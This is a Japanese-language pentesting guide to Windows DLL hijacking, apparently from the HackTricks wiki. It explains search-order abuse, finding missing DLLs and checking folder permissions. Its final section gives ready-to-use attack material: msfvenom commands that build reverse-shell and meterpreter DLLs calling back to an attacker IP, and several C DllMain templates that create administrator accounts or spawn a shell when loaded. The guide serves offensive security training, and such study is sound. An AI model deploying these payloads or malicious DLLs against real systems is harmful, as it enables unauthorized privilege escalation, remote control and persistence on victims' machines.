# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## 基本情報

DLLハイジャックは、信頼されたアプリケーションを操作して悪意のあるDLLを読み込ませることを含みます。この用語は、**DLLスプーフィング、インジェクション、サイドローディング**などのいくつかの戦術を含みます。主にコード実行、持続性の達成、そしてあまり一般的ではない特権昇格に利用されます。ここでの昇格に焦点を当てていますが、ハイジャックの手法は目的に関係なく一貫しています。

### 一般的な技術

DLLハイジャックにはいくつかの方法があり、各アプリケーションのDLL読み込み戦略に応じて効果が異なります：

1. **DLL置換**: 本物のDLLを悪意のあるDLLと入れ替え、オプションでDLLプロキシを使用して元のDLLの機能を保持します。
2. **DLL検索順序ハイジャック**: 悪意のあるDLLを正当なDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
3. **ファントムDLLハイジャック**: アプリケーションが読み込むための悪意のあるDLLを作成し、存在しない必要なDLLだと思わせます。
4. **DLLリダイレクション**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
5. **WinSxS DLL置換**: WinSxSディレクトリ内で正当なDLLを悪意のあるDLLと置き換える方法で、DLLサイドローディングに関連付けられることが多いです。
6. **相対パスDLLハイジャック**: コピーしたアプリケーションと共にユーザーが制御するディレクトリに悪意のあるDLLを配置し、バイナリプロキシ実行技術に似ています。

## 不足しているDllの発見

システム内の不足しているDLLを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**することです：

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

そして、**ファイルシステムアクティビティ**のみを表示します：

![](<../../images/image (314).png>)

**一般的に不足しているdllを探している場合**は、これを**数秒間**実行します。\
**特定の実行可能ファイル内の不足しているdllを探している場合**は、**「プロセス名」が「含む」"\<exec name>"のような別のフィルターを設定し、それを実行してイベントのキャプチャを停止するべきです**。

## 不足しているDllの悪用

特権を昇格させるために、最も良いチャンスは、**特権プロセスが読み込もうとするdllを書くことができる**ことです。したがって、**元のdll**があるフォルダーの前に**dllが検索されるフォルダー**に**dllを書くことができる**か、**dllが検索されるフォルダーのいずれかに書き込むことができる**必要があります（奇妙なケース）。または、元の**dllがどのフォルダーにも存在しないフォルダーに書き込むことができる**必要があります。

### Dll検索順序

**DLLがどのように特に読み込まれるかは、[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)で確認できます。**

**Windowsアプリケーション**は、特定の順序に従って**事前定義された検索パス**に従ってDLLを探します。DLLハイジャックの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正当なDLLの前に読み込まれることを保証する場合に発生します。これを防ぐための解決策は、アプリケーションが必要なDLLを参照する際に絶対パスを使用することを確認することです。

32ビットシステムの**DLL検索順序**は以下の通りです：

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用してこのディレクトリのパスを取得します。(_C:\Windows\System32_)
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。 (_C:\Windows\System_)
4. Windowsディレクトリ。 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用してこのディレクトリのパスを取得します。(_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。これは、**App Paths**レジストリキーによって指定されたアプリケーションごとのパスを含まないことに注意してください。DLL検索パスを計算する際に**App Paths**キーは使用されません。

これは、**SafeDllSearchMode**が有効な場合の**デフォルト**の検索順序です。これが無効になると、現在のディレクトリが2番目の位置に上昇します。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効です）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD_WITH_ALTERED_SEARCH_PATH**で呼び出されると、検索は**LoadLibraryEx**が読み込んでいる実行可能モジュールのディレクトリから始まります。

最後に、**dllは名前だけでなく絶対パスを指定して読み込まれる可能性がある**ことに注意してください。その場合、そのdllは**そのパス内でのみ検索されます**（dllに依存関係がある場合、それらは名前で読み込まれたものとして検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

#### Windowsドキュメントからのdll検索順序の例外

標準のDLL検索順序に対する特定の例外は、Windowsのドキュメントに記載されています：

- **メモリに既に読み込まれているDLLと同じ名前のDLL**が見つかった場合、システムは通常の検索をバイパスします。代わりに、リダイレクションとマニフェストのチェックを行い、メモリ内のDLLにデフォルトします。このシナリオでは、システムはDLLの検索を行いません。
- DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムはその既知のDLLのバージョンと、その依存DLLを使用し、**検索プロセスを省略します**。レジストリキー**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**には、これらの既知のDLLのリストが保持されています。
- **DLLに依存関係がある場合**、これらの依存DLLの検索は、最初のDLLがフルパスで識別されたかどうかに関係なく、**モジュール名**のみで示されたかのように行われます。

### 特権の昇格

**要件**：

- **異なる特権**（水平または側方移動）で動作するか、動作するプロセスを特定し、**DLLが不足している**ことを確認します。
- **DLLが検索される**任意の**ディレクトリ**に**書き込みアクセス**があることを確認します。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。

はい、要件を見つけるのは複雑です。**デフォルトでは、特権のある実行可能ファイルがDLLを欠いているのを見つけるのは奇妙です**し、**システムパスフォルダーに書き込み権限を持つのはさらに奇妙です**（デフォルトではできません）。しかし、設定が誤っている環境ではこれは可能です。\
運が良ければ要件を満たしている場合、[UACME](https://github.com/hfiref0x/UACME)プロジェクトを確認できます。**プロジェクトの主な目的はUACをバイパスすることですが、**使用できるWindowsバージョンのDLLハイジャックの**PoC**が見つかるかもしれません（おそらく書き込み権限のあるフォルダーのパスを変更するだけで済みます）。

フォルダー内の**権限を確認する**には、次のようにします：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
すべてのフォルダーの**パーミッションを確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行可能ファイルのインポートとDLLのエクスポートを確認するには、次のコマンドを使用できます:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
完全なガイドについては、**Dll Hijackingを悪用して権限を昇格させる**方法を確認してください。**System Pathフォルダー**に書き込み権限がある場合：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダーに書き込み権限があるかどうかを確認します。\
この脆弱性を発見するための他の興味深い自動化ツールは、**PowerSploit関数**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、および_Write-HijackDll_です。

### 例

悪用可能なシナリオを見つけた場合、成功裏に悪用するための最も重要なことの1つは、**実行可能ファイルがインポートするすべての関数を少なくともエクスポートするdllを作成すること**です。とにかく、Dll Hijackingは、[**中程度の整合性レベルから高い整合性レベルに昇格するために便利です（UACをバイパス）**](../authentication-credentials-uac-and-efs.md#uac)または[**高い整合性からSYSTEMに昇格するために**](./#from-high-integrity-to-system)**役立ちます。** 有効なdllを作成する方法の例は、この実行のためのdll hijackingに焦点を当てたdll hijacking研究の中にあります：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレート**として役立つ可能性のある**基本的なdllコード**や、**エクスポートされていない関数を持つdllを作成するためのコードを見つけることができます。

## **Dllの作成とコンパイル**

### **Dllプロキシ化**

基本的に、**Dllプロキシ**は、**読み込まれたときに悪意のあるコードを実行することができるDll**ですが、**実際のライブラリへのすべての呼び出しを中継することによって**、**期待通りに**機能することもできます。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)や[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実行可能ファイルを指定し、プロキシ化したいライブラリを選択して、**プロキシ化されたdllを生成**したり、**Dllを指定してプロキシ化されたdllを生成**したりできます。

### **Meterpreter**

**revシェルを取得（x64）：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メーターpreterを取得する (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する (x86のバージョンしか見当たらなかった):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### あなた自身の

いくつかのケースでは、コンパイルしたDllは、被害者プロセスによって読み込まれる**いくつかの関数をエクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはそれらを読み込むことができず**、**エクスプロイトは失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考文献

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



{{#include ../../banners/hacktricks-training.md}}
